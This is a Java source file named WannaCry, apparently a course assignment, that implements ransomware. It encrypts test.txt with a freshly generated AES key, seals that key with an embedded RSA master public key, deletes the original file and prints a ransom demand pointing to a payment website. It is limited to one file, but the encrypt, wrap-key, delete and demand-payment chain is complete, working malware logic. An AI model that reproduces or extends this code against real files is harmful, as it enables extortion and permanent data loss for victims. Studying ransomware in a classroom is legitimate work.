import javax.crypto.*;
import javax.crypto.spec.*;
import java.nio.file.*;
import java.security.*;
import java.security.spec.*;
import java.util.Base64;

public class WannaCry {
    // Master RSA public key (Base64 encoded) - provided by assignment
    // This must match exactly - any character difference will break decryption
    private static final String MASTER_PUBLIC_KEY_B64 = 
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpP" +
        "qoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXd" +
        "tcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w1" +
        "6YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1e" +
        "Wi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";

    public static void main(String[] args) {
        try {
            // Check if test.txt exists
            Path inputFile = Paths.get("test.txt");
            if (!Files.exists(inputFile)) {
                System.err.println("Error: test.txt not found in current directory");
                System.exit(1);
            }
            
            // 1. Generate 256-bit AES key
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(256);
            SecretKey aesKey = keyGen.generateKey();
            
            // 2. Create cipher with zero IV
            byte[] iv = new byte[16]; // all zeros
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            Cipher aesCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, ivSpec);
            
            // 3. Read and encrypt file
            byte[] plaintext = Files.readAllBytes(inputFile);
            byte[] ciphertext = aesCipher.doFinal(plaintext);
            
            // 4. Encrypt AES key with RSA master public key
            // Use explicit padding for cross-platform consistency
            PublicKey masterPublicKey = loadMasterPublicKey();
            Cipher rsaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            rsaCipher.init(Cipher.ENCRYPT_MODE, masterPublicKey);
            byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());
            
            // 5. Write encrypted files BEFORE deleting original
            // This ensures we don't lose data if something fails
            Files.write(Paths.get("test.txt.cry"), ciphertext);
            Files.write(Paths.get("aes.key"), encryptedAesKey);
            
            // 6. Delete original only after both files written successfully
            Files.delete(inputFile);
            
            // Display ransom message
            System.out.println();
            System.out.println("Dear User! Please note that your files have now been encrypted.");
            System.out.println("To recover your files we ask you to follow the instructions");
            System.out.println("in the website below to arrange a small payment:");
            System.out.println("https://...");
            System.out.println();
            
        } catch (java.nio.file.NoSuchFileException e) {
            System.err.println("Error: File not found - " + e.getFile());
        } catch (java.io.IOException e) {
            System.err.println("Error: IO error - " + e.getMessage());
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
    
    private static PublicKey loadMasterPublicKey() throws Exception {
        byte[] keyBytes = Base64.getDecoder().decode(MASTER_PUBLIC_KEY_B64);
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        return keyFactory.generatePublic(keySpec);
    }
}
